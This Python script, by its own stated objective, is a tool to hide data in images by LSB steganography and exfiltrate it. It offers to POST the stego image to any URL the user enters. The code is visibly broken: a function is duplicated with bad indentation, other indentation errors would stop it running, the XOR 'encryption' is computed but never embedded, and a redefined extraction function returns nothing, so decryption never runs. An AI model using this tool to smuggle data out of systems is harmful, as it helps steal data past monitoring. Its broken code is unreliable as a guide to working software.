 Objective: Create a working tool to hide and exfiltrate data using steganography

from stegano import lsb
from PIL import Image
import requests
import os
import time


# Encryption and Decryption Functions
def simple_encrypt(message, key):
    """Encrypt the message using XOR cipher."""
    return ''.join(chr(ord(c) ^ key) for c in message)

def simple_decrypt(ciphertext, key):
    """Decrypt the message using XOR cipher."""
    return ''.join(chr(ord(c) ^ key) for c in ciphertext)

# Progress bar
def progress_bar(task_name, duration=2):
    print(f"[+] {task_name}")
    for i in range(0, 101, 20):
        print(f"Progress: {i}%...", end="\r")
        time.sleep(duration/5)
    print("Progress: 100%... Done!\n")


# Step 1: Embed secret data in an image using LSB
def embed_message(image_path, secret_message, output_path):
    secret_image = lsb.hide(image_path, secret_message)
    secret_image.save(output_path)
    print(f"[+] Message embedded and saved to {output_path}")

def embed_file(image_path, file_path, output_path):
    with open(file_path, 'r') as f:
        file_content = f.read()
    secret_image = lsb.hide(image_path, file_content)
    secret_image.save(output_path)
    print(f"[+] File content embedded and saved to {output_path}")

    def embed_file(image_path, file_path, output_path):
    with open(file_path, 'r') as f:
        file_content = f.read()
    secret_image = lsb.hide(image_path, file_content)
    secret_image.save(output_path)
    print(f"[+] File content embedded and saved to {output_path}")



# Step 2: Simulate exfiltration - Upload image to a remote server (Here we use a placeholder URL)
def exfiltrate_file(file_path, target_url):
    if not os.path.exists(file_path):
        print("ERROR: File not found.")
        return
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            response = requests.post(target_url, files=files)
        if response.status_code == 200:
            print(f"File successfully sent to {target_url}")
        else:
            print(f"Upload failed. Server returned status code: {response.status_code}")
    except Exception as e:
        print(f"Upload failed with error: {str(e)}")

# Step 3: Extract data from the stego image
def extract_data(stego_image_path):
    secret = lsb.reveal(stego_image_path)
    print(f"[+] Extracted secret:\n {secret}")
    return secret

# Step 4: Validate that the embedding was successful
def validate_embedding(original_message, stego_image_path):
    extracted_message = lsb.reveal(stego_image_path)
    if extracted_message == original_message:
        print(" Validation successful: Message was correctly hidden and extracted!")
    else:
    print("Validation failed: Extracted message does not match original!")

# Extract hidden data
def extract_data(stego_image_path):
    secret = lsb.reveal(stego_image_path)
    if secret:
        print(f"[+] Extracted secret:\n{secret}\n")
    else:
        print("No hidden message found!")


# MENU
def main_menu():
    print("++++ Steganography ++++")
    print("1. Hide a secret message")
    print("2. Hide a file's content")
    print("3. Extract hidden message from image")
    print("4. Exit")
    choice = input("Choose an option (1-4): ").strip()
    return choice


# Main interaction
if __name__ == "__main__":
    while True:
        choice = main_menu()

        if choice == "1":
            cover_image = input("ENTER THE COVER IMAGE FILENAME: ").strip()
            if not os.path.exists(cover_image):
                print("\nError: Cover image not found!\n")
                continue
            message = input("ENTER THE SECRET MESSAGE: ").strip()

            try:
            key = int(input("ENTER A NUMERIC ENCRYPTION KEY (example: 5): ").strip())
            except ValueError:
                print("\nError: Invalid key entered. Must be a number.\n")
                continue

            # Encrypt the message
            encrypted_message = simple_encrypt(message, key)
            # DEBUG CHECK:
            #print(f"\n[DEBUG] Original message: {message}")
            #print(f"[DEBUG] Encrypted message: {encrypted_message}\n")


            stego_image = input("ENTER THE OUTPUT STEGO IMAGE FILENAME: ").strip()


            progress_bar("Hiding secret message...")
            embed_message(cover_image, message, stego_image)

            send_choice = input("DO YOU WANT TO SEND THIS IMAGE TO A REMOTE SERVER (yes/no): ").strip().lower()
            if send_choice == 'yes':
                url = input("ENTER THE UPLOAD URL: (ex: http://127.0.0.1:5000/upload): ").strip()
                exfiltrate_file(stego_image, url)
            else:
                print("[*] Exfiltration skipped.")




        elif choice == "2":
            cover_image = input("ENTER THE COVER IMAGE FILENAME: ").strip()
            if not os.path.exists(cover_image):
                print("\nERROR: Cover image not found!\n")
                continue
            file_path = input("ENTER THE TEXT FILE TO HIDE: ").strip()
            if not os.path.exists(file_path):
                print("\nERROR: Text file not found!\n")
                continue
            stego_image = input("ENTER THE OUTPUT STEGO IMAGE FILENAME: ").strip()
            progress_bar("Hiding file content...")
            embed_file(cover_image, file_path, stego_image)

            send_choice = input("DO YOU WANT TO SEND THIS IMAGE TO A REMOTE SERVER (yes/no): ").strip().lower()
            if send_choice == 'yes':
                url = input("ENTER THE UPLOAD URL: (ex: http://127.0.0.1:5000/upload): ").strip()
                exfiltrate_file(stego_image, url)
            else:
                print("[*] Exfiltration skipped.")



        elif choice == "3":
            stego_image = input("ENTER THE STEGO IMAGE FILENAME TO EXTRACT FROM: ").strip()
            if not os.path.exists(stego_image):
                print("ERROR: Stego image not found!\n")
                continue

            progress_bar("Extracting hidden message...")
            secret = extract_data(stego_image)

            if secret:
                print(f"[+] Raw extracted data:\n{secret}\n")
                try:
                    key = int(input("ENTER THE ENCRYPTION KEY USED TO HIDE THE MESSAGE: ").strip())
                    decrypted_message = simple_decrypt(secret, key)
                    print(f"[+] DECRYPTED SECRET MESSAGE:\n{decrypted_message}")
                except ValueError:
                    print("\nError: Invalid key entered. Decryption failed.\n")
            else:
                print("[-] No hidden message found!")


        elif choice == "4":
            print("\nExiting. Goodbye!")
            break

        else:
            print("Invalid option. Please try again!\n")




